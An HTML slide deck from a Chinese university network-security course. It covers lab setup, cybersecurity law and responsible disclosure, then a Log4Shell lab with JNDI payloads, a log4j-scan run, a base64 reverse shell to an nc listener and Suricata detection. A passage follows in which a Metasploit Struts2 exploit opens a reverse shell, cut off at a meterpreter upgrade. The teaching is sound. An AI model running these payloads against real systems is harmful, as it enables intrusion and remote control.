@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="黄玮">
+  <title>网络安全</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="lib/reveal.js/css/reveal.css">
+  <style type="text/css">code{white-space: pre;}</style>
+
+
+    <!-- For syntax highlighting using highlight.js-->
+    <link rel="stylesheet" href="lib/reveal.js/lib/css/zenburn.css">
+
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <link rel="stylesheet" href="lib/reveal.js/css/theme/white.css" id="theme">
+  <!-- Printing and PDF exports -->
+<link rel="stylesheet" media="print" href="lib/reveal.js/css/print/pdf.css" />
+  <script>
+    var link = document.createElement( 'link' );
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = window.location.search.match( /print-pdf/gi ) ? 'lib/reveal.js/css/print/pdf.css' : 'lib/reveal.js/css/print/paper.css';
+    document.getElementsByTagName( 'head' )[0].appendChild( link );
+  </script>
+  <!--[if lt IE 9]>
+  <script src="lib/reveal.js/lib/js/html5shiv.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">网络安全</h1>
+  <p class="author">黄玮</p>
+</section>
+
+<section>
+<section id="网络安全综合实验开源信息系统搭建加固与漏洞攻防" class="title-slide slide level1">
+<h1>网络安全综合实验：开源信息系统搭建、加固与漏洞攻防</h1>
+
+</section>
+<section id="内容提纲" class="slide level2">
+<h2>内容提纲</h2>
+<ul>
+<li>基础运行环境准备</li>
+<li>漏洞攻防环境现状</li>
+<li>漏洞攻防环境搭建</li>
+<li>漏洞攻击</li>
+<li>漏洞利用检测</li>
+<li>漏洞利用防御与加固</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="基础运行环境准备" class="title-slide slide level1">
+<h1>基础运行环境准备</h1>
+
+</section>
+<section id="二选一" class="slide level2">
+<h2>二选一</h2>
+<ul>
+<li>直接使用本学期课程实验所用的虚拟机环境</li>
+<li>[再来一遍] 从零开始搭建基础虚拟机环境</li>
+</ul>
+</section>
+<section id="基础虚拟机环境搭建必知必会" class="slide level2">
+<h2>基础虚拟机环境搭建必知必会</h2>
+<ul>
+<li>安装后虚拟机网卡没有分配到 IP ？</li>
+<li>SSH 服务启用与 SSH 免密登录
+<ul>
+<li>[可选] <a href="https://www.bilibili.com/video/BV1Hb4y1R7FE?p=52">vscode remote on win10</a></li>
+</ul></li>
+<li><a href="https://c4pr1c3.github.io/LinuxSysAdmin/cloud-init.md.html#/why-reset-machine-id">克隆出来的虚拟机 IP 地址一样？</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Hb4y1R7FE?p=19">多重加载镜像制作与使用</a></li>
+<li>备份与还原
+<ul>
+<li>虚拟机快照与还原</li>
+<li>默认配置文件编辑前备份</li>
+</ul></li>
+</ul>
+</section>
+<section id="基础虚拟机环境搭建必知必会指令汇编" class="slide level2">
+<h2>基础虚拟机环境搭建必知必会（指令汇编）</h2>
+<pre class="bash"><code># 确保使用 root 权限操作
+sudo su -
+
+# 养成良好配置习惯：备份配置文件
+cp /etc/network/interfaces /etc/network/interfaces.bak
+
+# 非交互式配置文件内容追加
+cat &lt;&lt; EOF &gt;&gt; /etc/network/interfaces
+allow-hotplug eth0
+iface eth0 inet dhcp
+allow-hotplug eth1
+iface eth1 inet dhcp
+EOF
+
+# 手动重启指定网卡
+ifdown eth{0,1} &amp;&amp; ifup eth{0,1}
+
+# 配置 SSH 服务开机自启动
+systemctl enable ssh
+
+# 启动 SSH 服务
+systemctl start ssh</code></pre>
+</section>
+</section>
+<section>
+<section id="漏洞攻防环境现状" class="title-slide slide level1">
+<h1>漏洞攻防环境现状</h1>
+
+</section>
+<section id="本课程第-7-章课件中推荐过的训练学习资源" class="slide level2">
+<h2><a href="chap0x07.md">本课程第 7 章课件中推荐过的训练学习资源</a></h2>
+<ul>
+<li><a href="https://github.com/c4pr1c3/ctf-games">https://github.com/c4pr1c3/ctf-games</a> 获得本课程定制的 Web 漏洞攻防训练环境</li>
+<li><a href="https://github.com/c0ny1/upload-labs">upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场</a></li>
+<li><a href="https://github.com/vulnspy/phpaudit-XXE">PHP XXE 漏洞与利用源代码分析示例</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe">vulhub 提供的 XXE 漏洞学习训练环境</a></li>
+<li><a href="https://github.com/c4pr1c3/python-xxe">python-xxe</a></li>
+<li><a href="https://github.com/c4pr1c3/sqli-labs">sqli-labs</a> | <a href="https://gitee.com/c4pr1c3/sqli-labs">sqli-labs 国内 gitee 镜像</a></li>
+<li><a href="https://github.com/c0ny1/xxe-lab">一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo</a></li>
+<li><a href="https://github.com/c0ny1/upload-labs">upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场</a></li>
+</ul>
+</section>
+<section id="vulhub" class="slide level2">
+<h2><a href="https://github.com/topics/vulhub">vulhub</a></h2>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub">vulhub/vulhub</a></li>
+<li><a href="https://github.com/fofapro/vulfocus">fofapro/vulfocus</a></li>
+<li><a href="https://github.com/sqlsec/ssrf-vuls">sqlsec/ssrf-vuls</a></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="漏洞攻防环境搭建" class="title-slide slide level1">
+<h1>漏洞攻防环境搭建</h1>
+
+</section>
+<section id="本课程的选型依据" class="slide level2">
+<h2>本课程的选型依据</h2>
+<ol type="1">
+<li>开箱即用，上手难度低</li>
+<li>包含「可复现漏洞环境」数量多、涵盖漏洞类型丰富</li>
+<li>运行负载低，可个人电脑单机使用</li>
+</ol>
+</section>
+<section id="fofaprovulfocus" class="slide level2">
+<h2><a href="https://github.com/fofapro/vulfocus">fofapro/vulfocus</a></h2>
+<blockquote>
+<p>🚀Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用。</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<h3 id="快速上手-vulfocus">快速上手 vulfocus</h3>
+<p><a href="https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus">c4pr1c3/ctf-games - fofapro/vulfocus</a></p>
+</section>
+</section>
+<section>
+<section id="知法守法" class="title-slide slide level1">
+<h1>知法守法</h1>
+
+</section>
+<section id="从知道到做到" class="slide level2">
+<h2>从「知道」到「做到」</h2>
+<ul>
+<li><a href="http://www.cac.gov.cn/2016-11/07/c_1119867116.htm">《中华人民共和国网络安全法》</a></li>
+<li>《刑法》</li>
+<li><a href="http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm">《网络产品安全漏洞管理规定》</a></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="the-law-is-the-law-1">《刑法》</h3>
+<p>第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪；提供侵入、非法控制计算机信息系统程序、工具罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</p>
+<p>违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</p>
+</section>
+<section class="slide level2">
+
+<h3 id="the-law-is-the-law-2">《刑法》</h3>
+<p>第二百八十六条 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。</p>
+<p>违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。</p>
+<p>故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p>
+</section>
+<section class="slide level2">
+
+<h3 id="第六章-渗透测试内容闪回">第六章 渗透测试内容闪回</h3>
+<table>
+<thead>
+<tr class="header">
+<th></th>
+<th>渗透测试</th>
+<th>网络入侵</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><strong>取得被测试目标的法律授权</strong></td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr class="even">
+<td>信息收集</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td>目标踩点</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>网络扫描</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td>漏洞发现</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>漏洞扫描（识别已知漏洞）</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td>漏洞挖掘（发现未知漏洞）</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td>漏洞利用之提升权限</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr class="odd">
+<td><strong>漏洞利用之后门植入</strong></td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr class="even">
+<td><strong>提供测试报告</strong></td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr class="odd">
+<td><strong>擦除入侵痕迹</strong></td>
+<td>ℹ️</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>ℹ️ 正常的渗透测试由于不会对被测试目标系统及网络造成破坏、点到即止。既然不是「入侵」，当然不存在「擦除入侵痕迹」的需求。但是，有时会在测试过程中出于评估漏洞危害的目的出发做的一些轻微的系统改动或测试数据获取（例如创建用户、读取指定用户数据），会在渗透测试结束后清理掉本地保存的测试数据以及还原测试前数据和系统状态。</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<h3 id="vuls-disclosure-1"><a href="http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm">《网络产品安全漏洞管理规定》</a></h3>
+<p><img data-src="images/vuls-awd/log4shell-and-aliyun.png" /></p>
+</section>
+<section class="slide level2">
+
+<h3 id="vuls-disclosure-2"><a href="http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm">《网络产品安全漏洞管理规定》</a></h3>
+<p>第七条 网络产品提供者应当履行下列网络产品安全漏洞管理义务，确保其产品安全漏洞得到及时修补和合理发布，并指导支持产品用户采取防范措施：</p>
+<p>（一）发现或者获知所提供网络产品存在安全漏洞后，应当立即采取措施并组织对安全漏洞进行验证，评估安全漏洞的危害程度和影响范围；对属于其 <strong>上游产品或者组件</strong> 存在的安全漏洞，应当 <strong>立即通知相关产品提供者</strong> 。</p>
+<p>（二）应当在 <strong>2日内</strong> 向 <code>工业和信息化部网络安全威胁和漏洞信息共享平台</code> 报送相关漏洞信息。报送内容应当包括存在网络产品安全漏洞的产品名称、型号、版本以及漏洞的技术特点、危害和影响范围等。</p>
+</section>
+<section class="slide level2">
+
+<h3 id="阿里云在-log4shell-事件中所犯的错误">阿里云在 Log4Shell 事件中所犯的错误</h3>
+<blockquote>
+<p>阿里云被工信部暂停网络安全威胁信息共享平台合作单位6个月</p>
+</blockquote>
+<ul>
+<li>2021-11-24 阿里云安全团队向 Apache 软件基金会报告漏洞</li>
+<li>2021-12-05 <a href="https://issues.apache.org/jira/browse/LOG4J2-3201"><code>Log4j 2</code> 开发团队发布第一个漏洞补丁</a></li>
+<li>2021-12-09 <a href="https://wap.miit.gov.cn/xwdt/gxdt/sjdt/art/2021/art_7587d13959e24aeb86887f7ef60d50d3.html">工业和信息化部网络安全威胁和漏洞信息共享平台收到有关网络安全专业机构报告</a></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="负责任的漏洞披露"><a href="http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm">负责任的漏洞披露</a></h3>
+<p>第九条 从事网络产品安全漏洞发现、收集的组织或者个人通过网络平台、媒体、会议、竞赛等方式向社会发布网络产品安全漏洞信息的，应当遵循 <strong>必要、真实、客观</strong> 以及 <code>有利于防范网络安全风险</code> 的原则</p>
+<ol type="1">
+<li><code>0day</code> 不抢跑</li>
+<li>远离业务数据</li>
+<li>杜绝恐吓式营销</li>
+<li>不发布或提供 <code>exp</code></li>
+<li>攻防一体不分家</li>
+<li>识大体顾大局</li>
+<li><code>0day</code> 非必要不出境
+<ul>
+<li>必要情况为：上报 <code>0day</code> 给所属境外网络产品提供者</li>
+</ul></li>
+</ol>
+</section>
+<section class="slide level2">
+
+<h3 id="vuls-disclosure-3"><a href="http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm">《网络产品安全漏洞管理规定》</a></h3>
+<p><strong>全文精读、深刻理解、全面落实，不要错过一个字、一个词、一句话。</strong></p>
+</section>
+<section class="slide level2">
+
+<p><strong>知法守法，从「知道」到「做到」。</strong></p>
+</section>
+</section>
+<section>
+<section id="漏洞攻击" class="title-slide slide level1">
+<h1>漏洞攻击</h1>
+
+</section>
+<section id="从单个漏洞靶标开始" class="slide level2">
+<h2>从单个漏洞靶标开始</h2>
+<blockquote>
+<p>一切来自于 <strong>用户输入</strong> 的数据都是不可信的。</p>
+</blockquote>
+<ol type="1">
+<li>找到靶标的【访问入口】</li>
+<li>收集【威胁暴露面】信息</li>
+<li>检测漏洞存在性</li>
+<li>验证漏洞可利用性</li>
+<li>评估漏洞利用效果</li>
+</ol>
+</section>
+<section id="以-log4j2-cve-2021-44228-为例" class="slide level2">
+<h2>以 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">log4j2 CVE-2021-44228</a> 为例</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44228&amp;vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&amp;version=3.1&amp;source=NIST">CVSS 3.1 标准 10 分(满分) 漏洞</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228/cpes">通过 CPE 看懂【相关】受影响软件列表</a> - CVE 通过 CPE 定义收录的受影响软件列表并不【完整】
+<ul>
+<li><a href="https://fofa.so/static_pages/log4j2">fofa.so 的 CVE-2021-44228 影响组件专题页面</a></li>
+<li><a href="https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592">Security Advisories / Bulletins / vendors Responses linked to Log4Shell (CVE-2021-44228)</a></li>
+</ul></li>
+</ul>
+</section>
+<section id="找到靶标的访问入口" class="slide level2">
+<h2>1. 找到靶标的【访问入口】</h2>
+<p><img data-src="images/vuls-awd/log4shell-entrypoint.png" /></p>
+<blockquote>
+<p>【威胁暴露面】信息已经直接看到了，本次漏洞攻击实验已完成该步骤</p>
+</blockquote>
+</section>
+<section id="漏洞原理详解" class="slide level2">
+<h2>漏洞原理详解</h2>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/263325">从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228漏洞</a></li>
+<li><a href="https://www.zhihu.com/question/505025655">如何看待log4j2远程代码执行漏洞?</a></li>
+<li><a href="https://blog.cloudflare.com/zh-cn/inside-the-log4j2-vulnerability-cve-2021-44228-zh-cn/">CVE-2021-44228 漏洞的历史记录，它是如何引入的</a></li>
+</ul>
+</section>
+<section id="log4shell-check-1" class="slide level2">
+<h2>3. 检测漏洞存在性</h2>
+<ul>
+<li>确认受漏洞影响组件的【版本号】</li>
+<li>源代码审计</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="确认受漏洞影响组件的版本号">确认受漏洞影响组件的【版本号】</h3>
+<p><img data-src="images/vuls-awd/log4j2-vul-codes.png" /></p>
+</section>
+<section class="slide level2">
+
+<h3 id="靶标环境漏洞源代码反编译">靶标环境漏洞源代码反编译</h3>
+<pre class="java number-lines"><code>// /demo/demo.jar
+public class Log4j2RceApplication {
+  private static final Logger logger = LogManager.getLogger(com.example.log4j2_rce.Log4j2RceApplication.class);
+  
+  public static void main(String[] args) {
+    SpringApplication.run(com.example.log4j2_rce.Log4j2RceApplication.class, args);
+  }
+  
+  @PostMapping({&quot;/hello&quot;})
+  public String hello(String payload) {
+    System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);
+    System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);
+
+    /* 以下为缺陷代码片段开始 */
+    logger.error(&quot;{}&quot;, payload);
+    logger.info(&quot;{}&quot;, payload);
+    logger.info(payload);
+    logger.error(payload);
+    /* 以上为缺陷代码片段结束 */
+    return &quot;ok&quot;;
+  }
+}</code></pre>
+</section>
+<section id="log4shell-poc-1" class="slide level2">
+<h2>4. 验证漏洞可利用性</h2>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>使用 <code>PoC</code> 手动测试 <code>${jndi:ldap://0qxc3d.dnslog.cn/exp}</code>
+<ul>
+<li>此处域名需要自己手动获取专属随机子域名</li>
+</ul></li>
+<li><a href="https://github.com/fullhunt/log4j-scan">fullhunt/log4j-scan</a></li>
+</ul>
+</section>
+<section id="log4shell-poc-2" class="slide level2">
+<h2>4. 验证漏洞可利用性</h2>
+<pre class="bash number-lines"><code># 自行替换其中的靶标 URL 和  ldap 协议域名
+curl -X POST http://192.168.56.216:49369/hello -d payload=&#39;&quot;${jndi:ldap://0qxc3d.dnslog.cn/exp}&quot;&#39;</code></pre>
+</section>
+<section id="log4shell-poc-3" class="slide level2">
+<h2>4. 验证漏洞可利用性</h2>
+<pre class="bash"><code>git clone https://github.com/fullhunt/log4j-scan &amp;&amp; cd log4j-scan
+
+# 如果没有安装过 pip
+sudo apt update &amp;&amp; sudo apt install -y python3-pip
+
+pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
+
+# 修改 log4j-scan.py
+# 手动编辑
+# post_data_parameters = [&quot;username&quot;, &quot;user&quot;, &quot;email&quot;, &quot;email_address&quot;, &quot;password&quot;]
+# 替换为以下内容
+# post_data_parameters = [&quot;username&quot;, &quot;user&quot;, &quot;email&quot;, &quot;email_address&quot;, &quot;password&quot;, &quot;payload&quot;]
+# 【或者】使用以下代码无脑替换
+sed -i.bak &#39;s/password&quot;/password&quot;, &quot;payload&quot;/&#39; log4j-scan.py
+
+# 自行替换其中的靶标 URL
+python3 log4j-scan.py --request-type post -u http://192.168.56.216:49369/hello
+# [•] CVE-2021-44228 - Apache Log4j RCE Scanner
+# [•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+# [•] Secure your External Attack Surface with FullHunt.io.
+# [•] Initiating DNS callback server (interact.sh).
+# [%] Checking for Log4j RCE CVE-2021-44228.
+# [•] URL: http://192.168.56.216:49369/hello
+# [•] URL: http://192.168.56.216:49369/hello | PAYLOAD: ${jndi:ldap://192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh/8tvw1m5}
+# [•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+# [•] Waiting...
+# [!!!] Target Affected
+# {&#39;timestamp&#39;: &#39;2021-12-21T02:55:30.472289751Z&#39;, &#39;host&#39;: &#39;192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh&#39;, &#39;remote_address&#39;: &#39;219.141.176.26&#39;}</code></pre>
+</section>
+<section id="evaluate-exp-1" class="slide level2">
+<h2>5. 评估漏洞利用效果</h2>
+<ul>
+<li><a href="https://github.com/Mr-xn/JNDIExploit-1">Mr-Xn/JNDIExploit-1</a>
+<ul>
+<li><a href="https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip">国内镜像下载地址</a></li>
+</ul></li>
+</ul>
+</section>
+<section id="evaluate-exp-2" class="slide level2">
+<h2>5. 评估漏洞利用效果</h2>
+<p><a href="https://asciinema.org/a/zWSQCVB2KpizZickmdTHzFDNv"><img data-src="https://asciinema.org/a/zWSQCVB2KpizZickmdTHzFDNv.svg" alt="asciicast" /></a></p>
+</section>
+<section id="evaluate-exp-3" class="slide level2">
+<h2>5. 评估漏洞利用效果</h2>
+<pre class="bash"><code>shasum -a 256 JNDIExploit-1.2-SNAPSHOT.jar
+# c96ce1de7f739575d86f2e558aeb97dc691077b31a1c510a3dabf096c827dfa8  JNDIExploit-1.2-SNAPSHOT.jar
+
+# 获取可用 post-exploit payload 清单
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -u 
+
+# 进入靶标容器查看支持的 shell 类型
+docker exec -it &lt;container_name&gt; bash
+cat /etc/shells
+# # /etc/shells: valid login shells
+# /bin/sh
+# /bin/bash
+# /usr/bin/bash
+# /bin/rbash
+# /usr/bin/rbash
+# /bin/dash
+# /usr/bin/dash
+
+# 此处省略【手动】测试 reverse shell 的过程
+
+# 192.168.56.214 为【攻击者】主机 IP
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.214 
+
+# 在【攻击者】主机上提前运行监听程序，等待反弹连接
+nc -l -p 7777
+
+# 第一个参数里的 192.168.56.216 是【靶机】IP
+# 后续参数里的 192.168.56.214 应是【攻击者】主机 IP
+curl http://192.168.56.216:19825/hello -d &#39;payload=${jndi:ldap://192.168.56.214:1389/TomcatBypass/Command/Base64/&#39;$(echo -n &#39;bash -i &gt;&amp; /dev/tcp/192.168.56.214/7777 0&gt;&amp;1&#39; | base64 -w 0 | sed &#39;s/+/%252B/g&#39; | sed &#39;s/=/%253d/g&#39;)&#39;}&#39;
+
+# 执行完上述【攻击负载】投放代码后，【攻击者】主机的 nc 窗口成功 getshell</code></pre>
+</section>
+</section>
+<section>
+<section id="漏洞利用检测" class="title-slide slide level1">
+<h1>漏洞利用检测</h1>
+
+</section>
+<section id="基本方法" class="slide level2">
+<h2>基本方法</h2>
+<ul>
+<li>面向网络流量的深度包检测</li>
+<li>运行时应用自我保护
+<ul>
+<li>Runtime Application Self-Protection (RASP)</li>
+</ul></li>
+</ul>
+</section>
+<section id="漏洞利用流量检测实战" class="slide level2">
+<h2>漏洞利用流量检测实战</h2>
+<pre class="bash"><code># 启动靶机镜像
+docker run -d --name log4shell -p 5555:8080 vulfocus/log4j2-rce-2021-12-09:latest
+
+# 启动 suricata 检测容器
+# 此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP
+docker run -d --name suricata --net=host -e SURICATA_OPTIONS=&quot;-i eth1&quot; jasonish/suricata:6.0.4
+
+# 更新 suricata 规则，更新完成测试完规则之后会自动重启服务
+docker exec -it suricata suricata-update -f
+
+# 重启 suricata 容器以使规则生效
+# docker restart suricata
+
+# 监视 suricata 日志
+docker exec -it suricata tail -f /var/log/suricata/fast.log
+
+# 重复前述【漏洞攻击】实验
+# 12/21/2021-08:30:55.434186  [**] [1:2034647:1] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034649:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034700:1] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034757:2] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034759:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034800:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034661:1] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555
+# 12/21/2021-08:30:55.434186  [**] [1:2034783:2] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol (Outbound) (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.1:52861 -&gt; 192.168.56.216:5555</code></pre>
+</section>
+</section>
+<section>
+<section id="漏洞利用防御与加固" class="title-slide slide level1">
+<h1>漏洞利用防御与加固</h1>
+
+</section>
+<section class="slide level2">
+
+<p><a href="https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/"><img data-src="images/vuls-awd/log4shell-detect-1.jpeg" /></a></p>
+</section>
+</section>
+<section>
+<section id="场景化漏洞攻防初体验" class="title-slide slide level1">
+<h1>场景化漏洞攻防初体验</h1>
+
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>以 vulfocus 提供的【跨网段渗透(常见的dmz)】为例</p>
+</blockquote>
+<p>可能是全网第一份关于该场景的公开 WriteUp 。</p>
+</section>
+<section id="场景安装与配置" class="slide level2">
+<h2>场景安装与配置</h2>
+<ul>
+<li>场景管理 - 从【场景商店】下载 <code>跨网段渗透(常见的dmz)</code> - 发布</li>
+<li>进入【场景】，启动场景</li>
+<li>阅读场景说明，找到场景入口地址，准备开始【跨网段渗透】体验</li>
+</ul>
+</section>
+<section id="捕获指定容器的上下行流量" class="slide level2">
+<h2>捕获指定容器的上下行流量</h2>
+<pre class="bash"><code># 建议放到 tmux 会话
+container_name=&quot;&lt;替换为目标容器名称或ID&gt;&quot;
+docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump</code></pre>
+<blockquote>
+<p>为后续的攻击过程「分析取证」保存流量数据</p>
+</blockquote>
+</section>
+<section id="攻破靶标1" class="slide level2">
+<h2>攻破靶标1</h2>
+<pre class="bash"><code># metasploit 基础配置
+# 更新 metasploit
+sudo apt install -y metasploit-framework
+
+# 初始化 metasploit 本地工作数据库
+sudo msfdb init
+
+# 启动 msfconsole
+msfconsole
+
+# 确认已连接 pgsql
+db_status
+
+# 建立工作区
+workspace -a demo
+
+# 信息收集之服务识别与版本发现
+# 通过 vulfocus 场景页面看到入口靶标的开放端口
+db_nmap -p 29551 192.168.56.216 -n -A
+
+# search exp in metasploit
+search struts2 type:exploit
+# Matching Modules
+# ================
+# 
+#    #  Name                                             Disclosure Date  Rank       Check  Description
+#    -  ----                                             ---------------  ----       -----  -----------
+# ...
+#    2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+# ...
+#    7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
+
+# 查看 exp 详情
+# 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
+info 2
+
+# 继续完善搜索关键词
+search S2-059 type:exploit
+
+# Matching Modules
+# ================
+# 
+#    #  Name                                        Disclosure Date  Rank       Check  Description
+#    -  ----                                        ---------------  ----       -----  -----------
+#    0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
+# 
+
+# 使用上述 exp
+use 0
+
+# 查看 exp 可配置参数列表
+show options
+
+# 查看可用 exp payloads
+show payloads
+
+# 使用合适的 exp payload
+set payload payload/cmd/unix/reverse_bash
+
+# 配置 exp 参数
+# 确保所有 Required=yes 参数均正确配置
+
+# 靶机 IP
+set RHOSTS 192.168.56.216 
+# 靶机目标端口
+set rport  29551          
+# 攻击者主机 IP
+set LHOST  192.168.56.214 
+
+# 再次检查 exp 配置参数列表
+show options
+
+# getshell
+run -j
+
+# 如果攻击成功，查看打开的 reverse shell
+sessions -l
+
+# Active sessions
+# ===============
+# 
+#   Id  Name  Type            Information  Connection
+#   --  ----  ----            -----------  ----------
+#   1         shell cmd/unix               192.168.56.214:4444 -&gt; 192.168.56.216:60690  (192.168.56.216)
+
+# 进入会话 1
+sessions -i 1
+# 无命令行交互提示信息，试一试 Bash 指令
+id
+
+# get flag-1
+ls /tmp
+# flag-{bmh59f8b130-69ea-495d-86a9-dbf789e18b3f}
+
+# 通过 CTRL-Z 将当前会话放到后台继续执行</code></pre>
+</section>
+<section id="建立立足点并发现靶标2-4" class="slide level2">
+<h2>建立立足点并发现靶标2-4</h2>
+<pre class="bash"><code># upgrade cmdshell to meterpreter shell
